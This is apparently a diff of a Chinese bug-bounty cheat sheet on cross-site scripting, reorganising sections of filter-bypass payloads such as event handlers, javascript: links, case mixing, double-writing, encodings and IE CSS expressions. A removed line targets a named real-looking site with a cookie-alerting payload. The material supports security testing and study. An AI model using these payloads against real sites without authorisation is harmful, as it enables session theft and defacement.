@@ -6,7 +6,7 @@
 >
 > 那么此时的 XSS 只作用于 test.com, 不会影响 example.com.
 
-Reflected-XSS和DOM-XSS时常不收,留意公告
+Reflected-XSS 和 DOM-XSS 时常不收, 留意公告
 
 ## 1. 原理
 
@@ -14,7 +14,7 @@ Reflected-XSS和DOM-XSS时常不收,留意公告
 
 ```
 GET /?search=test HTTP/2
-Host: web-security-academy.net
+Host: example.com
 ```
 
 ```
@@ -39,7 +39,7 @@ Host: web-security-academy.net
 若无法弹窗验证或者控制台验证可以尝试组合CSRF使用
 
 ```
-<img src="http://example.com/login">
+<img src="http://example.com/logout">
 ```
 
 ### 1.2 常用触发事件
@@ -82,16 +82,11 @@ onfocus="alert(1)"	    # 元素获得焦点时触发（如 <input>）
 <textarea></textarea>
 ```
 
-提交这个字符串可以判断过滤了哪些字符，有的字符只可在 IE 中使用
+提交这个字符串可以判断过滤了哪些字符，有的 payload 只可在 IE 中使用
 
 ```
-xss"""'''```<>＜＞.,:;onmousemovejavascriptstyle(1)
+'''"""```></tExtArEa>＞＜/tExtArEa＞.,:;onmousemovejavascriptstyle(1)
 ```
-
-### 2.1. 案例
-
-- [使用全角尖括号绕过](https://hackerone.com/reports/639684)
-- [在线 Markdown 渲染链接时将标题与链接拼接](https://hackerone.com/reports/526325)
 
 ## 3. 文件解析类
 
@@ -147,31 +142,58 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 - [xss](https://github.com/jadensalas469466/tools/tree/main/hack/payload/xss)
 - [pdfsvgxsspayload](https://github.com/ynsmroztas/pdfsvgxsspayload)
 
+## 4. Bypass
+
+将隐藏类型转换为可见类型
+
+```
+type="hidden"
+type="text"
+```
+
+引号闭合插入事件绕过
+
+```
+" onclick="alert(1)"
+```
+
+尖括号闭合插入标签绕过
+
+```
+"><img/src/onerror="alert(1)">
+```
+
+`href` 伪协议绕过
+
+```
+<a href="javascript:alert(1)">1</a>
+```
+
+双写绕过
+
+```
+<a href="javascjavascriptript:alert(1)">1</a>
+```
+
+大小写绕过
+
+```
+<a href="jaVaScRipT:alert(1)">1</a>
+```
+
+URL 编码绕过
+
+```
+%22%3e%3cimg%2fsrc%2fonerror%3d%22alert%281%29%22%3e
+```
+
+添加 HTML 编码后的 Tab 绕过
+
+```
+<a href="javasc&#09;ript:alert(1)">1</a>
+```
+
 ## ==未归纳==
-
-```html
-"><script>alert(1)</script>
-```
-
-```
-GET /show/login/show_error_page.action?errorMsg=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E HTTP/1.1
-Host: hb.wanguoschool.com
-
-```
-
->  URL 编码
-
-存储型 xss 使用控制台返回
-
-```html
-<script>console.log(1)</script>
-```
-
-在 JS 标签中只允许执行英文小写
-
-```
-javascript
-```
 
 分隔符绕过，某些分隔符会让后面的字符串变成新的属性，例如：`<input type="text" name="p1" value="xss"> ,:;onmousemove="alert(6)"` ，生成了 `onmousemove=""` 属性
 
@@ -179,74 +201,10 @@ javascript
 xss"> ,:;onmousemove=alert(1)
 ```
 
-任意标签可插入 JS 标签绕过
-
-```
-<script>alert(6)</script>
-<script>alert(6)</script></b>
-```
-
-标签闭合，即可插入 JS 标签
-
-```
-xss"><script>alert(6)</script>
-<input type="text" name="p1" value="xss"><script>alert(6)</script>
-```
-
-`input` 事件绕过，很多标签过滤了 `<>` 可以通过插入事件绕过（ `input` 中若过滤了 `""` 则肯定无法绕过）
-
-```
-xss" onmousemove="alert(6)">
-<input type="text" name="p1" value="xss" onmousemove="alert(6)">">
-```
-
-`href` 伪协议绕过，可以将 URL 地址指向一个伪协议
-
-```
-javascript:alert(6)
-<a href="javascript:alert(1)">javascript:alert(6)</a>
-```
-
-双写绕过，有的过滤规则是将 javascript 或 script 替换为空
-
-```
-javajavascriptscript
-```
-
-大小写绕过，有的过滤规则无法识别大小写
-
-```
-jaVaScRipT
-```
-
 atob 解 Base64 编码绕过
 
 ```
 <script>eval(atob("YWxlcnQoNik="))</script>
-```
-
-Tab HTML 实体编号绕过，有的过滤规则是将 javascript 转义为 javaxscript ，可以利用 Tab HTML 实体编号绕过
-
-```
-<a href="javasc&#09;ript:alert(6)">xss</a>
-```
-
-IE 浏览器 input 标签 style 属性伪协议绕过
-
-```
-style="background-image:url(javascript:alert(6))"
-```
-
-IE 浏览器的 expression 绕过
-
-```
-hello:expression(alert(6))
-```
-
-CSS 层叠样式表注释会替换为空
-
-```
-hello:expr/**/ession(alert(6))
 ```
 
 尖括号的十六进制编码绕过
@@ -372,3 +330,27 @@ svg 可以自动解析 js 标签中的 html 编码
 <svg><script>&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script>
 ```
 
+### IE
+
+IE 浏览器 input 标签 style 属性伪协议绕过
+
+```
+style="background-image:url(javascript:alert(6))"
+```
+
+IE 浏览器的 expression 绕过
+
+```
+hello:expression(alert(1))
+```
+
+CSS 层叠样式表注释会替换为空
+
+```
+hello:expr/**/ession(alert(1))
+```
+
+---
+
+- [使用全角尖括号绕过](https://hackerone.com/reports/639684)
+- [在线 Markdown 渲染链接时将标题与链接拼接](https://hackerone.com/reports/526325)
